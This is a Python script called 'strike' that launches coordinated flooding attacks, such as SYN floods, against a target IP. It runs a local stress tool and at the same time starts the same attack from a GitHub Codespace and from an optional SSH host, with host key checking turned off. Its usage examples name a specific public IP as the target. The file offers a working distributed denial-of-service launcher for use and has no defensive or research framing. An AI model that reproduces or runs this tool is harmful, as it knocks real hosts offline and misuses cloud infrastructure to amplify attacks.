#!/usr/bin/env python3
"""strike — launch local + cloud attacks in one command."""

import sys, os, time, subprocess, threading, json, signal, pwd
from datetime import datetime

BANNER = "  strike — coordinated attack"

# sudo changes HOME — resolve real user's home from SUDO_USER or passwd
_real_user = os.environ.get("SUDO_USER") or os.environ.get("USER") or "joshuam"
try:
    HOME = pwd.getpwnam(_real_user).pw_dir
except KeyError:
    HOME = os.environ.get("HOME", "/home/joshuam")
LOCAL = f"{HOME}/pentools/stress.py"
LOG = "/tmp/strike.log"
GH_BIN = f"{HOME}/bin/gh"

procs = []


def log(msg):
    t = datetime.now().strftime("%H:%M:%S")
    print(f"  [{t}] {msg}")
    with open(LOG, "a") as f:
        f.write(f"[{t}] {msg}\n")


def run_local(target, method, duration):
    log(f"local: {method} on {target} ({duration}s)")
    python = sys.executable
    cmd = [python, LOCAL, target, method, str(duration)]
    if method == "syn":
        cmd = ["sudo"] + cmd
    p = subprocess.Popen(
        cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
    )
    procs.append(("local", p))
    for line in p.stdout or []:
        line = line.strip()
        if line:
            print(f"  ┌─ local ─ {line}")
    p.wait()
    log(f"local: exit {p.returncode}")


def run_codespace(target, method, duration):
    if not os.path.isfile(GH_BIN):
        log("codespace: gh not installed — skipping")
        return

    try:
        r = subprocess.run(
            [GH_BIN, "codespace", "list", "--json", "name,state"],
            capture_output=True,
            text=True,
            timeout=10,
        )
    except (FileNotFoundError, OSError):
        log("codespace: gh not available — skipping")
        return

    if r.returncode != 0 or not r.stdout.strip():
        log("codespace: none found — skipping")
        return

    try:
        spaces = json.loads(r.stdout)
        active = [s for s in spaces if s.get("state") == "Available"]
        if not active:
            log("codespace: none available — skipping")
            return
        cs = active[0]["name"]
    except (json.JSONDecodeError, KeyError, IndexError):
        log("codespace: parse error — skipping")
        return

    log(f"codespace: {cs} — deploying")
    cmd = [
        GH_BIN,
        "codespace",
        "ssh",
        "-c",
        cs,
        "--",
        f"cd /workspaces/pentools && git pull -q && python3 stress.py {target} {method} {duration}",
    ]
    p = subprocess.Popen(
        cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
    )
    procs.append(("codespace", p))
    for line in p.stdout or []:
        line = line.strip()
        if line:
            print(f"  ┌─ cloud ─ {line}")
    p.wait()
    log(f"codespace: exit {p.returncode}")


def run_ssh(target, method, duration, host):
    log(f"ssh: {host}")
    cmd = [
        "ssh",
        "-o",
        "StrictHostKeyChecking=no",
        "-o",
        "ConnectTimeout=5",
        host,
        f"cd pentools && python3 stress.py {target} {method} {duration}",
    ]
    p = subprocess.Popen(
        cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
    )
    procs.append(("ssh", p))
    for line in p.stdout or []:
        line = line.strip()
        if line:
            print(f"  ┌─ ssh ─ {line}")
    p.wait()
    log(f"ssh: exit {p.returncode}")


def handler(sig, frame):
    log("stopping...")
    for _, p in procs:
        if p.poll() is None:
            p.terminate()
    sys.exit(0)


if __name__ == "__main__":
    signal.signal(signal.SIGINT, handler)
    print(BANNER)

    if len(sys.argv) < 3:
        print("  usage: python3 strike.py <target> <method> [duration] [ssh-host]")
        print("  examples:")
        print("    sudo python3 strike.py 2.121.59.67 syn 30")
        print("    python3 strike.py 2.121.59.67 all 20 user@vps")
        sys.exit(1)

    target = sys.argv[1]
    method = sys.argv[2].lower()
    dur = int(sys.argv[3]) if len(sys.argv) > 3 and sys.argv[3].isdigit() else 30
    ssh_host = sys.argv[4] if len(sys.argv) > 4 else None

    log(f"target: {target}  method: {method}  duration: {dur}s")

    threads = [threading.Thread(target=run_local, args=(target, method, dur))]
    threads.append(threading.Thread(target=run_codespace, args=(target, method, dur)))
    if ssh_host:
        threads.append(
            threading.Thread(target=run_ssh, args=(target, method, dur, ssh_host))
        )

    for t in threads:
        t.start()
    for t in threads:
        t.join()

    log("all done")
